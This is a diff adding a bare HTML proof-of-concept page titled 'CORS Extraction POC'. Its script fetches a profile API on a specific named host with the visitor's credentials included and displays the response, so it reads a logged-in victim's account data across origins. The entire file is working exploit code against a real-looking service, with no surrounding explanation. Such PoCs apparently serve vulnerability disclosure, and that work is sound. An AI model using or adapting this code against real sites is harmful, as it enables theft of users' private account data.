@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS Extraction POC</h2>
+<pre id="out">Waiting...</pre>
+<script>
+fetch("https://root.atwv1.mokapos.com/api/profile", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+  document.getElementById("out").innerText = data;
+})
+.catch(err => {
+  document.getElementById("out").innerText = "Blocked: " + err;
+});
+</script>
+</body>
+</html>
